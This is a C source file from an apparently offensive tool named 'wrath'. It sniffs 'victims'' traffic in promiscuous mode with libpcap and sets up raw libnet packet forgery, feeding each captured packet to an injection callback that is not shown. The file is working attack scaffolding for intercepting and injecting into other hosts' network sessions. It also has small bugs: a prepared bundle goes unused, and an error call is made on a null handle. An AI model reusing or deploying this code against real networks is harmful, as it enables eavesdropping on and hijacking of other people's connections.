#include <pcap.h>
#include <libnet.h>
#include <stdlib.h>
#include "wrath-structs.h"

void wrath_inject(u_char *, const struct pcap_pkthdr *, const u_char *);
// will need to cast the pointer to u_char. (struct arg_vals *) args

// places wrath in the position to capture the victims packets
pcap_t *wrath_position(struct arg_values *cline_args) {
	struct pcap_pkthdr cap_header;
	const u_char *packet, *pkt_data;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	pcap_t *pcap_handle;
	
	if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
		device = pcap_lookupdev(errbuf);
		if(device == NULL) {
			fprintf(stderr, "error fetching interface: %s %s\n", errbuf, "(this program must be run as root)");
			exit(1);
		}
	} else { // if interface is set
		device = cline_args->interface;
	}

	printf("Watching victims on %s\n", device);	

	/* snaplen
	   14 bytes for ethernet header
	   20 bytes for internet protocol header (without options)	   
		-option possibilities
	   20 bytes for transmission control protocol header (without options) 

	   It's a possibility that while sniffing webserver traffic we may want to
	   leave enough room to sniff HEADER information
	*/
	pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf); //
	if (pcap_handle == NULL)
		pcap_perror(pcap_handle, errbuf);
	
	// parse/compile bpf (if filter is null, skip this step)
	if (strcmp(cline_args->filter,"\0") != 0) { // if filter is set
		struct bpf_program fp;
		if((pcap_compile(pcap_handle, &fp, cline_args->filter, 1, 0)) == -1) {
			pcap_perror(pcap_handle, "ERROR compiling filter");
			exit(1); 
		}
		if(pcap_setfilter(pcap_handle, &fp) == -1) {
			pcap_perror(pcap_handle, "ERROR setting filter");
			exit(1);
		}
	}

	return pcap_handle;
}

void wrath_observe(struct arg_values *cline_args) {
	struct lcp_package *chp; // contains command-line args, libnet handle (file descriptor), and packet forgery memory
	libnet_t *libnet_handle;
	pcap_t *pcap_handle;
	char libnet_errbuf[LIBNET_ERRBUF_SIZE];
	char pcap_errbuf[PCAP_ERRBUF_SIZE];
	char *device;

	/* initializing bundle */
	chp = (struct lcp_package *) malloc(sizeof (struct lcp_package));
	chp->cline_args = cline_args;

	/* initializing sniffer, getting into position */
	/* might be problems with the pieces of memory for 
	structs created in position, especially errbuf and device */
	pcap_handle = wrath_position(cline_args); 

	/* grabbing device name for libnet */
		if (strcmp(cline_args->interface, "\0") == 0) { // if interface is not set
			device = pcap_lookupdev(pcap_errbuf);
			if(device == NULL) {
				fprintf(stderr, "error fetching interface: %s %s\n", pcap_errbuf, "(this program must be run as root)");
				exit(1);
			}
		} else { // if interface is set
			device = cline_args->interface;
		}

	// need to initialize environment for libent in advanced mode
	libnet_handle = libnet_init(LIBNET_RAW4_ADV, device, libnet_errbuf);
	if (libnet_handle == NULL)
		fprintf(stderr, "trouble initiating libnet interface: %s \n", libnet_errbuf);
	chp->libnet_handle = libnet_handle;
	
	// need to initialize memory for packet construction
	chp->packet = (u_char *) malloc(4126); 

	int cap_amount = -1;
	if (cline_args->count != -1) // if count is set
		cap_amount = cline_args->count;

	pcap_loop(pcap_handle, cap_amount, wrath_inject, (u_char *) cline_args);

	pcap_close(pcap_handle);
}
